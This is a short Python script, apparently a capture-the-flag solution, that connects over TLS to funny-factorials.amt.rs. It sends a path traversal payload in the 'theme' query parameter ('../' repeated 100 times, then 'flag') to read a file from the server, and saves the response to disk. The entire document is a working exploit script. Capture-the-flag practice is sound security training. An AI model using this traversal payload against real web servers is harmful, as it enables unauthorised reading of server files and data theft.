import socket
import time
import ssl


context = ssl.create_default_context()

with socket.create_connection(("funny-factorials.amt.rs", 443)) as client:
    with context.wrap_socket(client, server_hostname="funny-factorials.amt.rs") as ssock:
        ssock.settimeout(1)

        ssock.send(f"""GET /?theme={'../' * 100}flag HTTP/1.1
Host: funny-factorials.amt.rs
Accept: text/html
Accept-Language: en-US

""".encode("utf-8"))
        time.sleep(2)
        site = str(ssock.recv(4096)).replace("\\n", "\n")
        # site += str(ssock.recv(4096)).replace("\\n", "\n")
        site = site[-site[::-1].index("r\\") + 1:]

with open("site.html", "w") as file:
    file.write(site)
